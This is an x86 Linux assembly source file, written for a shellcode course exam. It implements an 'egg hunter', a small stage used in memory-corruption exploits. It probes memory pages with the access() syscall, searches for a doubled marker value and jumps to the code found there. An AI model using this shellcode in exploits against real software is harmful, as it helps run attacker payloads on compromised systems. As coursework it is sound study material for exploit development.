; egg_hunter_access_1_x86.nasm
; Author: Jack McBride (PA-6483)
; Website: https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
; Assignment 3: Linux x86 Egg Hunter Shellcode

global _start

section .text

_start:

_setup:

	mov ebx, 0x50905090;		Move the egg into EBX register
	
	xor ecx, ecx;			Clear ECX register
	
	mul ecx;			Clear EAX and EDX registers

_loop_inc_page:
	
	or dx, 0xfff;			Go to last address in the memory page

_loop_inc_one:

	inc edx;			Increase the memory counter by 1

_loop_check:

	pusha;				Push the registers to the stack to save them
	
	lea ebx,[edx+0x4];		Set EBX to the pathname pointer
	
	mov al,0x21;			Set al to syscall number 33 in hex
	
	int 0x80;			Execute access() syscall
	
	cmp al, 0xf2;			Check if result is an access violation
	
	popa;				restore registers

_loop_check_valid:
	
	jz _loop_inc_page;		If access violation, jump to next page in memory
	
	cmp [edx],ebx;			Check for first half of egg

	jnz _loop_inc_one;		If no match, increment memory counter by one

	cmp [edx+0x4],ebx;		Check for second half of egg
	
	jnz _loop_inc_one;		If no match, increment memory counter by one

_matched:
	
	jmp edx;			If match, jmp to memory address containing egg
